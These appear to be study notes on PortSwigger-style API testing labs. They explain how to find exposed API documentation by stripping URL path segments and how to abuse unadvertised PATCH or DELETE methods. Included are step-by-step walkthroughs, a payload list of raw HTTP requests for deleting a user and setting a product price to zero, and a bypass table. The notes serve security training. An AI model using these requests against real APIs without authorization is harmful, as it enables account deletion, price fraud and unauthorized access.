# API testing — Discovery, documentation, and HTTP methods

Strip path segments from observed API URLs to reach auto-generated documentation. Use OPTIONS to discover allowed methods. Use PATCH/DELETE on endpoints that only advertise GET to exploit missing method-level authorization.

## Quick reference
```
# Reach API docs by stripping path
PATCH /api/user/wiener   (observed in proxy)
      /api/user          -> error "no user identifier"
      /api               -> API documentation (interactive)
-> find DELETE /api/user/{username} -> delete carlos

# Discover and use unused PATCH method
OPTIONS /api/products/3/price  ->  Allow: GET, PATCH
PATCH /api/products/1/price
Content-Type: application/json
{"price":0}
-> leather jacket now $0 -> add to basket -> checkout
```

## Root cause
- API documentation endpoints are often left unrestricted (no auth required on /api/).
- HTTP method enforcement is often applied only to the methods developers expected to be used; other methods on the same endpoint skip authorization.
- REST APIs that auto-generate docs (Swagger/OpenAPI) may expose full API schema at a root path.

## Find it
1. Note every API request in proxy history (look for `/api/` in path).
2. Try stripping path segments one by one and observing responses:
   - Different error = still in API space.
   - JSON documentation = jackpot.
3. For every API endpoint, send OPTIONS → read `Allow:` header → try every listed method.
4. Try methods NOT in the Allow header too — enforcement may be incomplete.

## Technique
**Documentation discovery:**
1. Observe `PATCH /api/user/wiener` in proxy.
2. Repeater: remove `/wiener` → `PATCH /api/user` → "no user identifier" error.
3. Remove `/user` → `GET /api` → interactive API documentation page.
4. Open in browser → find DELETE endpoint → send `DELETE /api/user/carlos` → solved.

**Unused HTTP method (price tamper):**
1. Browse product page → proxy shows `GET /api/products/3/price`.
2. Send to Repeater. Change method to OPTIONS → `Allow: GET, PATCH`.
3. Change to PATCH → "Unauthorized" (need to be logged in first).
4. Log in, find `GET /api/products/1/price` (leather jacket) in proxy history.
5. Repeater: PATCH → "incorrect Content-Type" error → add `Content-Type: application/json`.
6. Body `{}` → "missing price parameter" error.
7. Body `{"price":0}` → price set to $0.
8. Add jacket to basket → checkout → solved.

## Payload arsenal
```http
# Documentation discovery
GET /api HTTP/1.1

# Delete user via docs
DELETE /api/user/carlos HTTP/1.1

# Unused PATCH method
PATCH /api/products/1/price HTTP/1.1
Content-Type: application/json

{"price":0}

# OPTIONS recon
OPTIONS /api/products/1/price HTTP/1.1
```

## Bypasses
| Defense | Bypass |
|---|---|
| Auth required on /api/user | Docs endpoint /api/ may be open even if /api/user requires auth |
| Method not exposed in UI | OPTIONS reveals it; server enforces per-method? test each |
| Content-Type enforcement | Add correct Content-Type header (application/json) |

## Exploitation walkthrough
**Documentation:** strip path segs from observed PATCH → reach GET /api → open in browser → DELETE /api/user/carlos → solved.

**Price tamper:** OPTIONS → PATCH → auth error → log in → PATCH /api/products/1/price + `{"price":0}` → $0 jacket → checkout.

## Chaining
- API docs often expose DELETE, admin operations → [Access-control](../../Access-control/).
- Price = 0 via PATCH → same outcome as [Business-logic-vulnerabilities/Client-side-controls](../../Business-logic-vulnerabilities/Client-side-controls/).

## Tools
- **Burp Repeater** — method switching, path manipulation
- **OPTIONS request** — allowed method discovery

## Labs

### Exploiting an API endpoint using documentation [Apprentice]
PATCH /api/user/wiener → strip path → GET /api → interactive docs → DELETE /api/user/carlos. Key insight: API documentation endpoints are often unauthenticated and expose all available operations.

### Finding and exploiting an unused API endpoint [Practitioner]
OPTIONS /api/products/3/price → Allow: GET, PATCH. Log in → PATCH /api/products/1/price + Content-Type: application/json + `{"price":0}` → $0 jacket. Key insight: APIs often implement more methods than the UI exposes; PATCH without authorization on price = critical logic flaw.

## Real-world notes
- Always check /api/, /api/v1/, /api/swagger.json, /openapi.json for exposed docs.
- Method confusion (GET-only endpoint secretly handles PATCH) is extremely common in REST APIs.
- Test PATCH/PUT with an empty body first → error messages reveal expected fields.

## References
- https://portswigger.net/web-security/api-testing
